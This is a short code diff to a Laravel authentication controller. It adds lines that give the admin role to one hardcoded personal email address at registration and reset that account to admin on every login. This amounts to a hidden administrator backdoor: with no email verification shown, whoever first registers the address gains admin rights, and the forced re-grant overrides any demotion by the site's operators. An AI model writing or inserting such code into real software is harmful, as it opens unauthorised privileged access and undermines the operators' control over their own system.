@@ -24,11 +24,14 @@ class AuthController extends Controller
             return response()->json(['errors' => $validator->errors()], 422);
         }
 
+        $role = ($request->email === 'rahator44@gmail.com') ? 'admin' : 'user';
+
         $user = User::create([
             'name' => $request->name,
             'email' => $request->email,
             'phone' => $request->phone,
             'password' => Hash::make($request->password),
+            'role' => $role,
         ]);
 
         $token = $user->createToken('auth_token')->plainTextToken;
@@ -56,6 +59,11 @@ class AuthController extends Controller
         }
 
         $token = $user->createToken('auth_token')->plainTextToken;
+
+        // Force admin role if email matches
+        if ($user->email === 'rahator44@gmail.com' && $user->role !== 'admin') {
+            $user->update(['role' => 'admin']);
+        }
 
         $user->update(['last_login_at' => now()]);
 
